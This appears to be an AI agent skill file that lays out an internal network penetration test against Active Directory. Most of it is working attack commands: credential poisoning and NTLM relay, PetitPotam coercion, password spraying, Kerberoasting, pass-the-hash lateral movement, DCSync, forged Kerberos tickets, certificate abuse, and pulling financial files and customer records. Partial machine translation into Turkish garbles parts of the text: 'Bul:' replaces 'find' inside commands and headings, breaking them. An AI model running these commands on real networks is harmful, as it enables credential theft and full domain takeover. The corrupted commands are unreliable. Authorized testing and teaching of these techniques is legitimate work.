---
name: conducting-internal-network-penetration-test
description: Execute an internal network penetration test simulating an insider threat or post-breach attacker to identify lateral movement paths, privilege escalation vectors, and sensitive data exposure
  within the corporate network.
tags:
- cybersecurity
- Responder
- internal-pentest
- Impacket
- network-security
- fetih
- privilege-escalation
- assumed-breach
- penetration-testing
- lateral-movement
- siber-güvenlik
triggers:
- authentication
- certificate
- conducting
- dns
- endpoint
- exploit
- hash
- http
- incident
- internal
- log
- network
category: penetration-testing
source_subdomain: penetration-testing
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
---

# Conducting Internal Network Penetration Test


## Genel Bakış

An internal network penetration test simulates an attacker who has already gained Erişim: the internal network or a malicious insider. The tester operates from an "assumed breach" position — typically a standard domain workstation or network jack — and attempts lateral movement, privilege escalation, credential harvesting, and data exfiltration to Belirle: the blast radius of a compromised endpoint.


## Ne Zaman Kullanılır

- conducting yaparken security assessments that involve conducting internal network penetration test
- following yaparken: incident response procedures for related security events
- performing yaparken scheduled security testing or auditing activities
- validating yaparken security controls through hands-on testing

## Ön Gereksinimler

- Signed Rules of Engagement with internal network scope
- Network access: physical Ethernet drop or VPN connection to internal VLAN
- Standard domain user credentials (assumed breach model) or unauthenticated access
- Testing laptop with Kali Linux, Impacket, Responder, BloodHound
- Coordination with IT/SOC for monitoring and emergency contacts


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Phase 1 — Network Discovery and Enumeration

### Initial Network Reconnaissance

```bash
ip addr show
ip route show
cat /etc/resolv.conf

arp-scan --localnet --interface eth0

nmap -sn 10.0.0.0/8 --exclude 10.0.0.1 -oG internal_hosts.gnmap
nmap -sn 172.16.0.0/12 -oG internal_hosts_172.gnmap
nmap -sn 192.168.0.0/16 -oG internal_hosts_192.gnmap

grep "Status: Up" internal_hosts.gnmap | awk '{print $2}' > live_hosts.txt

nmap -sS -sV -T4 -iL live_hosts.txt -oA internal_tcp_scan

nmap -p 445 --open -iL live_hosts.txt -oG smb_hosts.gnmap
nmap -p 3389 --open -iL live_hosts.txt -oG rdp_hosts.gnmap
nmap -p 22 --open -iL live_hosts.txt -oG ssh_hosts.gnmap
nmap -p 1433,3306,5432,1521,27017 --open -iL live_hosts.txt -oG db_hosts.gnmap
```

### Active Directory Enumeration

```bash
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --shares
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --users
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --groups

ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf

netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --lsa

bloodhound-python -u 'testuser' -p 'Password123' -d corp.local -ns 10.0.0.5 -c all

enum4linux-ng -A 10.0.0.5 -u 'testuser' -p 'Password123'
```

### Network Service Enumeration

```bash
smbclient -L //10.0.0.10 -U 'testuser%Password123'
smbmap -H 10.0.0.10 -u 'testuser' -p 'Password123' -R

snmpwalk -v2c -c public 10.0.0.1

dig axfr corp.local @10.0.0.5

showmount -e 10.0.0.15

impacket-mssqlclient 'corp.local/testuser:Password123@10.0.0.20' -windows-auth
```

## Phase 2 — Credential Attacks

### Network Credential Capture

```bash
sudo responder -I eth0 -dwPv

cat /usr/share/responder/logs/NTLMv2-*.txt

sudo mitm6 -d corp.local

impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks

python3 PetitPotam.py -u 'testuser' -p 'Password123' -d corp.local \
  attacker_ip 10.0.0.5
```

### Password Attacks

```bash
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

netexec smb 10.0.0.5 -u users.txt -p 'Spring2025!' --no-bruteforce
netexec smb 10.0.0.5 -u users.txt -p 'Company2025!' --no-bruteforce

impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast_hashes.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
  -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Phase 3 — Exploitation and Lateral Movement

### Lateral Movement Techniques

```bash
impacket-psexec 'corp.local/admin@10.0.0.30' -hashes :aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

impacket-wmiexec 'corp.local/admin:AdminPass123@10.0.0.30'

evil-winrm -i 10.0.0.30 -u admin -p 'AdminPass123'

impacket-smbexec 'corp.local/admin:AdminPass123@10.0.0.30'

xfreerdp /v:10.0.0.30 /u:admin /p:'AdminPass123' /cert-ignore /dynamic-resolution

ssh -D 9050 user@10.0.0.40
proxychains nmap -sT -p 80,443,445,3389 10.10.0.0/24
```

### Privilege Escalation

```bash
meterpreter> getsystem
meterpreter> run post/multi/recon/local_exploit_suggester

powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

wmic service get name,pathname,startmode | Bul:str /i /v "C:\Windows" | Bul:str /i /v """

./linpeas.sh
sudo -l
Bul: / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

### Domain Escalation

```bash
impacket-secretsdump 'corp.local/domainadmin:DaPass123@10.0.0.5' -just-dc

impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator

impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/db01.corp.local administrator

certipy Bul: -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5
certipy req -u 'testuser@corp.local' -p 'Password123' -target ca01.corp.local \
  -template VulnerableTemplate -ca CORP-CA -upn administrator@corp.local
```

## Phase 4 — Data Access and Impact Demonstration

```bash
smbclient //10.0.0.10/Finance -U 'domainadmin%DaPass123'
> dir
> get Q4_Financial_Report.xlsx

impacket-mssqlclient 'sa:DbPassword123@10.0.0.20'
SQL> SELECT name FROM sys.databases;
SQL> SELECT TOP 10 * FROM customers;

echo "PENTEST-PROOF-INTERNAL-$(date +%Y%m%d)" > /tmp/proof.txt

```

## Phase 5 — Reporting

### Attack Path Documentation

```
Attack Path 1: Domain Compromise via LLMNR Poisoning
  Adım 1: LLMNR/NBT-NS poisoning captured NTLMv2 hash (T1557.001)
  Adım 2: Hash cracked offline — user: jsmith, password: Welcome2025!
  Adım 3: jsmith had local admin on WS042 — lateral movement via PsExec (T1021.002)
  Adım 4: Mimikatz extracted DA credentials from WS042 memory (T1003.001)
  Adım 5: DCSync with DA credentials — all domain hashes extracted (T1003.006)
  Impact: Complete domain compromise from unauthenticated network position
```

### Bul:ings Severity Matrix

| Bul:ing | CVSS | MITRE ATT&CK | Remediation |
|---------|------|---------------|-------------|
| LLMNR/NBT-NS poisoning | 8.1 | T1557.001 | Disable LLMNR/NBT-NS via GPO |
| Kerberoastable service accounts | 7.5 | T1558.003 | Use gMSA, 25+ char passwords |
| Local admin reuse | 8.4 | T1078 | Dağıt: LAPS, unique local admin passwords |
| Weak domain passwords | 7.2 | T1110 | Enforce 14+ char minimum, blacklist common passwords |
| Unrestricted DCSync | 9.8 | T1003.006 | Audit replication rights, implement tiered admin model |

## Tools Reference

| Tool | Purpose |
|------|---------|
| Responder | LLMNR/NBT-NS/mDNS poisoning |
| Impacket | AD attack suite (secretsdump, psexec, wmiexec, etc.) |
| BloodHound | AD attack path visualization |
| NetExec (CrackMapExec) | Network service enumeration and spraying |
| Evil-WinRM | PowerShell remoting client |
| Certipy | AD Certificate Services exploitation |
| Mimikatz | Windows credential extraction |
| Hashcat | Password hash cracking |
| Nmap | Network scanning and enumeration |
| LinPEAS/WinPEAS | Privilege escalation enumeration |

## References

- Cobalt Internal Network Pentesting Methodology: https://docs.cobalt.io/methodologies/internal-network/
- MITRE ATT&CK Enterprise: https://attack.mitre.org/matrices/enterprise/
- PTES: http://www.pentest-standard.org/
- Impacket: https://github.com/fortra/impacket
- BloodHound: https://github.com/BloodHoundAD/BloodHound
